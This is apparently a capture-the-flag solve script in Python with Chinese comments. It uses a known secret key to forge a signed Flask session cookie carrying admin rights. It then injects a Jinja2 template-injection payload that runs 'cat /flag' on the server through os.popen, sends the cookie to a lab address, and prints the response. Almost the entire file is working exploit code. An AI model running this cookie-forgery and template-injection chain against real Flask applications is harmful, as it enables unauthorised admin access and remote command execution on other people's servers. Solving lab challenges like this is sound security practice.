import requests
import html
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer
import sys

# --- 配置区域 ---
TARGET_URL = '172.17.0.15:14947/admin'
SECRET_KEY = 'Th1s@one!seCret!'  # 题目提供的密钥
SALT = 'cookie-session'  # Flask 默认的 salt

# 自定义头部信息
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/127.0',
    'Upgrade-Insecure-Requests': '1'
}


# --- 核心函数：生成 Flask Session Cookie ---
def encode_flask_cookie(secret_key, cookie_data):
    """
    直接使用 itsdangerous 库模拟 Flask 生成 Session 的过程
    """
    try:
        # Flask 默认使用 TaggedJSONSerializer 处理复杂对象
        serializer = URLSafeTimedSerializer(
            secret_key=secret_key,
            salt=SALT,
            serializer=TaggedJSONSerializer(),
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
        )
        return serializer.dumps(cookie_data)
    except Exception as e:
        print(f"Cookie 生成失败: {e}")
        sys.exit(1)


# --- 构造 Payload ---
# SSTI 攻击语句：读取 /flag 文件
ssti_payload = "{{get_flashed_messages.__globals__.get('os').popen('cat /flag').read()}}"

# 构建 Session 数据结构
session_data = {
    "role": {
        "is_admin": 1,
        "name": "test",
        "flag": ssti_payload  # 将 payload 注入到 flag 字段中
    }
}

print(f"[*] 正在构造 Payload: {session_data}")

# --- 生成 Cookie ---
signed_cookie = encode_flask_cookie(SECRET_KEY, session_data)
print(f"[*] 生成的 Session Cookie: {signed_cookie}")

# --- 发送请求 ---
cookies = {
    'session': signed_cookie
}

try:
    print(f"[*] 正在发送请求到 {TARGET_URL} ...")
    response = requests.get(TARGET_URL, headers=headers, cookies=cookies)

    print(f"[*] 状态码: {response.status_code}")

    # 解码并打印结果
    response_content = html.unescape(response.text)
    print("\n--- 响应内容 (部分) ---")
    # 通常 Flag 会在特定的标签里，这里打印全部或通过关键字筛选
    if "flag{" in response_content or "PCTF{" in response_content:
        print("!!! 发现 Flag !!!")

    print(response_content)

except Exception as e:
    print(f"请求发送失败: {e}")